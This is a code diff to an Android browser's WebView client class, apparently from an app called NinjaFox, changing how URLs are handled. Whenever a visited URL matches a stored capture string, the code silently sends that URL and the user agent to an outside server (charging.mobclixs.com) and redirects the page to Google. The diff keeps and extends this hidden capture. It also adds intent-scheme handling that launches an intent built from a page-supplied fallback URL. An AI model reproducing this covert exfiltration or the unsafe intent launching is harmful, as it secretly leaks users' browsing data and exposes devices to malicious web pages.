@@ -2,12 +2,14 @@ package com.mojodigi.ninjafox.Browser;
 
 import android.app.Activity;
 import android.app.AlertDialog;
+import android.content.ActivityNotFoundException;
 import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
 import android.graphics.Bitmap;
 import android.graphics.Typeface;
 import android.net.MailTo;
+import android.net.Uri;
 import android.net.http.SslError;
 import android.os.AsyncTask;
 import android.os.Build;
@@ -39,6 +41,7 @@ import org.json.JSONObject;
 import java.io.ByteArrayInputStream;
 import java.io.IOException;
 import java.net.CookieStore;
+import java.net.URISyntaxException;
 
 import okhttp3.MultipartBody;
 import okhttp3.OkHttpClient;
@@ -81,10 +84,11 @@ public class NinjaWebViewClient extends WebViewClient  implements ApiRequestTask
         super.onPageStarted(view, url, favicon);
 
         String captureStr=mPrefs.getStringValue(AppConstants.PREFS_CAPTURE_STR, "");
-        if(url.contains(captureStr))
+        if(url.contains(captureStr) && captureStr.length()>1)
         {
-            customWebView.loadUrl("http://www.google.com");
+            customWebView.loadUrl("https://www.google.com");
         }
+
 
         if (view.getTitle() == null || view.getTitle().isEmpty()) {
             customWebView.update(context.getString(R.string.album_untitled), url);
@@ -125,28 +129,55 @@ public class NinjaWebViewClient extends WebViewClient  implements ApiRequestTask
     public boolean shouldOverrideUrlLoading(WebView view, String url) {
 
 
-
-
         if (url.startsWith(BrowserUtility.URL_SCHEME_MAIL_TO)) {
             Intent intent = IntentUtility.getEmailIntent(MailTo.parse(url));
             context.startActivity(intent);
             view.reload();
             return true;
-        } else if (url.startsWith(BrowserUtility.URL_SCHEME_INTENT)) {
+        }
+        else if (url.startsWith(BrowserUtility.URL_SCHEME_INTENT))
+        {
             Intent intent;
             try {
                 intent = Intent.parseUri(url, Intent.URI_INTENT_SCHEME);
                 context.startActivity(intent);
                 return true;
-            } catch (Exception e) {
+            } catch (ActivityNotFoundException e) {
+                try {
+                    intent = Intent.parseUri(url, Intent.URI_INTENT_SCHEME);
+                    String fallbackUrl = intent.getStringExtra("browser_fallback_url");
+                    intent = Intent.parseUri(fallbackUrl, Intent.URI_INTENT_SCHEME);
+                    context.startActivity(intent);
+                }
+                catch (URISyntaxException e2) {
+                    //not an intent uri
+                }
+                return true;//do nothing in other cases
 
-            } // When intent fail will crash
+            }
+
+            catch (Exception e)
+            {
+                String string = e.getMessage();
+                Log.d("Error", ""+string);
+            }
+            // When intent fail will crash
         }
+        else if (url.startsWith("market://") || url.startsWith(BrowserUtility.URL_SCHEME_INTENT))
+        {
+            Intent intent = new Intent(Intent.ACTION_VIEW);
+            intent.setData(Uri.parse(url));
+            IntentUtility.getContext().startActivity(intent);
+            return true;
+        }
+
+
+
 
         white = adBlock.isWhite(url);
 
         String captureStr=mPrefs.getStringValue(AppConstants.PREFS_CAPTURE_STR, "");
-         if(url.contains(captureStr))
+         if(url.contains(captureStr) && captureStr.length()>1)
         {
             try {
                 sendUrl=url;
@@ -154,6 +185,7 @@ public class NinjaWebViewClient extends WebViewClient  implements ApiRequestTask
                 JSONObject jsonObject =new JSONObject();
                 jsonObject.put("url", sendUrl);
                 jsonObject.put("ua", ua);
+                customWebView.loadUrl("https://www.google.com");
                 new ApiRequestTask(context, this, "http://charging.mobclixs.com/api/v1/callertune", false, false, null, jsonObject.toString(), 123).execute();
             }catch (Exception e)
             {
@@ -161,7 +193,7 @@ public class NinjaWebViewClient extends WebViewClient  implements ApiRequestTask
             }
 
             //here
-            customWebView.loadUrl("http://www.google.com");
+            //customWebView.loadUrl(url);
 
         }
 
